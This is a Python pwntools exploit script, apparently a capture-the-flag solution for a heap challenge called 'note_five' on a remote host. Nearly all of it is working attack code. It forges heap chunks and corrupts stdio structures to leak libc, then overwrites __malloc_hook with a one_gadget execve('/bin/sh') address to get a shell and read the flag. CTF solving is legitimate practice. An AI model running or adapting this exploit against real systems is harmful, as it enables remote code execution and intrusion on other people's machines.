#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './note_five'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('112.126.103.195', 9999)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/5gx $rebase(0x202080)
        end

    b malloc
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def New(index, size):
    sh.sendlineafter('>> ', '1')
    sh.sendlineafter('idx: ', str(index))
    sh.sendlineafter('size: ', str(size))

def edit(index, content):
    sh.sendlineafter('>> ', '2')
    sh.sendlineafter('idx: ', str(index))
    sh.sendafter('content: ', content)

def delete(index):
    sh.sendlineafter('>> ', '3')
    sh.sendlineafter('idx: ', str(index))

New(0, 0x98)
New(1, 0x98)
New(2, 0x98)
New(3, 0x98)

delete(0)
edit(1, 'a' * 0x90 + p64(0x140) + p8(0xa0))
delete(2)

New(0, 0xe8)
edit(1, 'a' * 0x40 + p64(0) + p64(0xf1) + p64(0) + p16(0x37f8 - 0x10) + '\n')
New(4, 0xe8)
delete(4)

edit(1, 'a' * 0x40 + p64(0) + p64(0xf1) + p16(0x25cf) + '\n')
New(4, 0xe8)
New(0, 0xe8)
edit(0, 'b' * 0x41 + p64(0xfbad2887 | 0x1000) + p64(0) * 3 + p8(0x88) + '\n')

result = sh.recvn(8)
libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))

delete(4)
edit(1, 'a' * 0x40 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols['_IO_2_1_stdin_'] + 143) + '\n')
New(4, 0xe8)
New(0, 0xe8)

edit(0, '\0' * 0xe1 + p32(0xf1) + '\n')
delete(4)
edit(1, 'a' * 0x40 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols['_IO_2_1_stdin_'] + 376) + '\n')
New(4, 0xe8)
New(0, 0xe8)
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
edit(0, '\0' * 0xa0 + p64(libc_addr + 0x4526a) + p64(libc_addr + libc.symbols['realloc'] + 13) + '\n')

# pause()
New(0, 0xe8)

sh.sendline('cat flag')

sh.interactive()
clear()